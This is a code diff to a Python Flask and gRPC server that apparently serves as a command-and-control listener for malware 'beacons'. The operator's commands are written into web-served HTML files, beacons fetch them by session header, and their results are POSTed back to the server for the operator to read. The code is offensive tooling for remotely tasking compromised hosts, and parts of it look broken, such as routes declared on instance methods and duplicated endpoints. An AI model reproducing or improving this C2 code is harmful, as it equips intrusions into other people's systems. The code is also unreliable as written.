@@ -7,22 +7,28 @@ import protobuff_pb2 as pb2
 
 app = Flask(__name__)
 
+
 class RunFlask(pb2_grpc.UnaryServicer):
     def __init__(self, *args, **kwargs):
-        pass
+        self.response = ''
 
     def GetServerResponse(self, request, context):
 
         # We need an ID (ID for beacon) and message (What to tell the beacon)
         message = request.message
-        ID = request.ID
-        f = open(f"/var/www/html/{ID}.html", "a")
-        f.write(message)
-        f.close()
-        result = f'Hello I am up and running received "{message}" message from you'
-        result = {'message': result, 'received': True}
-
-        return pb2.MessageResponse(**result)
+        ID = request.bID
+        opt = request.opt
+        if opt == 'SC':
+            f = open(f"/var/www/html/{ID}.html", "a")
+            f.write(message)
+            f.close()
+            result = f'Received command, wrote {message} to file {ID}'
+            result = {'message': result, 'received': True}
+            return pb2.MessageResponse(**result)
+        elif opt == 'GR':
+            result = f'Getting status of beacon {ID}'
+            result = {'message': self.response, 'received': True}
+            return pb2.MessageResponse(**result)
 
     @app.route("/")
     def home(self):
@@ -39,24 +45,27 @@ class RunFlask(pb2_grpc.UnaryServicer):
             f = open(f"/var/www/html/{val}.html", "a")
             f.write(message)
             f.close()
-            return('')
+            return ('')
 
     @app.route('/<path:filename>', methods=['GET', 'POST'])
     def index(self, filename):
         if request.method == 'GET':
             val = {request.headers['APPSESSIONID']}
-            print(f'Host {val} grabbed command')
+            stats = f'Host {val} grabbed command'
             return send_from_directory('.', filename)
-
+            # result = {'message': stats, 'received': True}
+            # return pb2.MessageResponse(**result)
 
         return jsonify(request.data)
 
-    @app.route("/<path:filename>",methods = ['POST'])
+    @app.route("/<path:filename>", methods=['POST'])
     def results(self):
         if request.method == 'POST':
             val = {request.headers['APPSESSIONID']}
             print(f'Result: {request.data} from beacon: {val}')
+            self.response = request.data
             return 'HELO'
+
 
 def serve():
     server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
@@ -66,5 +75,6 @@ def serve():
     app.run(debug=True)
     server.wait_for_termination()
 
-if __name__=="__main__":
-   serve()
+
+if __name__ == "__main__":
+    serve()
